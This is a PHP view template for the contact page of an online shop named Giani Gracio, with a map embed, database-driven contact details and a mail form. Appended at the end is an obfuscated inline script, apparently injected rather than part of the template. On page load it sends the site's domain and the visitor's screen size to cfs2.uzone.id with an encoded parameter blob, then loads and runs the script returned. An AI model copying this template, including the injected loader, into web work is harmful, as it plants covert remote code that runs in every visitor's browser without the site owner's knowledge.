
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>

<!-- Main Container Starts -->
	<div class="main-container container">
	<!-- Breadcrumb Starts -->
		<ol class="breadcrumb">
			<li><a href="<?=base_url()?>">Home</a></li>
			<li class="active">Contact Us</li>
		</ol>
	<!-- Breadcrumb Ends -->
	<!-- Main Heading Starts -->
		<h2 class="main-heading text-center">
			Contact Us
		</h2>
	<!-- Main Heading Ends -->
	<!-- Google Map Starts -->
		<div id="map-wrapper">
			<div id="map-block" style="height: 248px; position: relative; background-color: rgb(229, 227, 223); overflow: hidden;">
				<iframe src="https://www.google.com/maps/embed?pb=!1m10!1m8!1m3!1d31685.878108542907!2d107.60404117128905!3d-6.922277351073848!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1476178196941" width="1137px" height="248px" frameborder="0" style="border:0" allowfullscreen></iframe>
			</div>
		</div>
	<!-- Google Map Ends -->
	<!-- Starts -->
		<div class="row">
		<!-- Contact Details Starts -->
			<div class="col-sm-4">
				<div class="panel panel-smart">
					<div class="panel-heading">
						<h3 class="panel-title">Contact Details</h3>
					</div>
					<div class="panel-body">
					<?php foreach($contact as $row){?>
						<ul class="list-unstyled contact-details">
							<li class="clearfix">
								<i class="fa fa-home pull-left"></i>
								<span class="pull-left">
									Company <br />
									<?=$row->address?>
								</span>
							</li>
							<li class="clearfix">
								<i class="fa fa-phone pull-left"></i>
								<span class="pull-left">
									<?=$row->phone?>
								</span>
							</li>
							<li class="clearfix">
								<i class="fa fa-envelope pull-left"></i>
								<span class="pull-left">
									<a href="mailto:<?=$row->email?>"><?=$row->email?></a>
								</span>
							</li>
							<li class="clearfix">
								<i class="fa fa-facebook pull-left"></i>
								<span class="pull-left">
									&nbsp; <a href="https://<?=$row->fb?>"><?=$row->fb?></a> 
								</span>
							</li>
							<li class="clearfix">
								<i class="fa fa-twitter pull-left"></i>
								<span class="pull-left">
									<a href="https://<?=$row->twit?>"><?=$row->twit?></a>
								</span>
							</li>
						</ul>
						<?php } ?>
					</div>
				</div>
			</div>
		<!-- Contact Details Ends -->
		<!-- Contact Form Starts -->
			<div class="col-sm-8">
				<div class="panel panel-smart">
					<div class="panel-heading">
						<h3 class="panel-title">Send us a mail</h3>
					</div>
					<div class="panel-body">
					<?=$this->session->flashdata('sent')?>
						<form class="form-horizontal" role="form" method="post" action="<?=base_url().'home/sendemail'?>">
							<div class="form-group">
								<label for="name" class="col-sm-2 control-label">
									Name
								</label>
								<div class="col-sm-10">
									<input type="text" class="form-control" name="name" id="name" placeholder="Name">
								</div>
							</div>
							<div class="form-group">
								<label for="email" class="col-sm-2 control-label">
									Email
								</label>
								<div class="col-sm-10">
									<input type="email" class="form-control" name="email" id="email" placeholder="Email">
								</div>
							</div>
							<div class="form-group">
								<label for="subject" class="col-sm-2 control-label">
									Subject 
								</label>
								<div class="col-sm-10">
									<input type="text" class="form-control" name="subject" id="subject" placeholder="Subject">
								</div>
							</div>
							<div class="form-group">
								<label for="message" class="col-sm-2 control-label">
									Message
								</label>
								<div class="col-sm-10">
									<textarea name="message" id="message" class="form-control" rows="5" placeholder="Message"></textarea>
								</div>
							</div>
							<div class="form-group">
								<div class="col-sm-offset-2 col-sm-10">
									<button type="submit" class="btn btn-main text-uppercase">		Submit
									</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		<!-- Contact Form Ends -->
		</div>
	<!-- Ends -->
	</div>
<!-- Main Container Ends -->

<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->

<script src="https://maps.googleapis.com/maps/api/js?v=3&sensor=false"></script>
<script src="<?=base_url()?>assets/js/map.js"></script>

<script src="<?=base_url()?>assets/js/jquery-1.11.1.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery-migrate-1.2.1.min.js"></script>	
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<script src="<?=base_url()?>assets/js/bootstrap-hover-dropdown.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.magnific-popup.min.js"></script>
<script src="<?=base_url()?>assets/js/custom2.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>